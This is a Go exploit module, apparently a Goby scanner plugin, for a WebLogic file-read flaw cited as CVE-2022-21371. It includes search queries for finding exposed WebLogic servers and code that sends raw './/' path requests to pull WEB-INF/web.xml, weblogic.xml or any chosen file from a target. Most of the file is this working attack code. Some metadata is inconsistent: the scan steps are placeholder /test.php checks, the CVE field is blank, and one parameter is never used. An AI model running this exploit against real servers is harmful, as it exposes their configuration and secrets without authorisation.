package exploits

import (
	"bufio"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "WebLogic File Read Vulnerability",
    "Description": "<p>Oracle FusionMiddleware is a business innovation platform for enterprises and cloud environments from Oracle Corporation of the United States. The platform provides middleware, software collections and other functions. Oracle WebLogic Server is one of the application server components suitable for cloud and traditional environments. In CVE-2022-21371, attackers can exploit this vulnerability to read sensitive information in WebLogic Server, such as web.xml. Oracle has officially released a security update to fix the vulnerability.</p>",
    "Product": "BEA-WebLogic-Server",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2024-04-24",
    "PostTime": "2024-09-29",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\") || (title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\") || (title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "1",
    "Impact": "<p>Attackers can exploit this vulnerability to read sensitive information in WebLogic Server, such as web.xml. </p>",
    "Recommendation": "<p>Update the patch according to <a href=\"https://www.oracle.com/security-alerts/cpujan2022.html.\">https://www.oracle.com/security-alerts/cpujan2022.html.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "filePath,Customize",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "select",
            "value": "WEB-INF/web.xml,WEB-INF/portlet.xml,WEB-INF/weblogic.xml",
            "show": "mode=filePath"
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "WEB-INF/web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.2",
    "Translation": {
        "CN": {
            "Name": "WebLogic 文件读取漏洞",
            "Product": "BEA-WebLogic-Server",
            "Description": "<p>Oracle FusionMiddleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。在 CVE-2022- 21371 中，攻击者可利用该漏洞读取Weblogic Server 中的敏感信息，例如web.xml等。Oracle官方已发布安全更新以修复该漏洞。<br></p>",
            "Recommendation": "<p>根据 <a href=\"https://www.oracle.com/security-alerts/cpujan2022.html\">https://www.oracle.com/security-alerts/cpujan2022.html</a> 更新升级补丁。<br></p>",
            "Impact": "<p>攻击者可利用该漏洞读取Weblogic Server 中的敏感信息，例如web.xml等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "WebLogic File Read Vulnerability",
            "Product": "BEA-WebLogic-Server",
            "Description": "<p>Oracle FusionMiddleware is a business innovation platform for enterprises and cloud environments from Oracle Corporation of the United States. The platform provides middleware, software collections and other functions. Oracle WebLogic Server is one of the application server components suitable for cloud and traditional environments. In CVE-2022-21371, attackers can exploit this vulnerability to read sensitive information in WebLogic Server, such as web.xml. Oracle has officially released a security update to fix the vulnerability.<br></p>",
            "Recommendation": "<p>Update the patch according to <a href=\"https://www.oracle.com/security-alerts/cpujan2022.html.\">https://www.oracle.com/security-alerts/cpujan2022.html.</a><br></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to read sensitive information in WebLogic Server, such as web.xml.&nbsp;<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "Variables": {},
    "PocId": "9957"
}`
	var sendPayloadADCXdDSFDSFa = func(u *httpclient.FixUrl, filePath string) (s string, err error) {
		var conn net.Conn
		switch u.Scheme() {
		case "http":
			conn, err = httpclient.GetTCPConn(u.HostInfo)
			if err != nil {
				return "", err
			}
		case "https":
			conn, err = httpclient.GetTLSConn(u.HostInfo)
			if err != nil {
				return "", err
			}
		default:
			return "", errors.New("error")
		}
		rawPayload := fmt.Sprintf("GET .//%s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"+
			"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Connection: close\r\n\r\n", filePath, u.HostInfo)
		_ = conn.SetDeadline(time.Now().Add(time.Second * 5))
		_, err = conn.Write([]byte(rawPayload))
		if err != nil {
			return "", err
		}
		reader := bufio.NewReader(conn)
		var resp = ""
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			resp += line
		}
		if !strings.Contains(resp, "\r\n\r\n") {
			return "", errors.New("error")
		}
		return strings.Split(resp, "\r\n\r\n")[1], nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadADCXdDSFDSFa(u, "/WEB-INF/web.xml")
			if err != nil {
				return false
			}
			if !strings.Contains(resp, "<filter-mapping>") {
				return false
			}
			ss.VulURL = u.String()
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := stepLogs.Params["filePath"].(string)
			resp, err := sendPayloadADCXdDSFDSFa(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
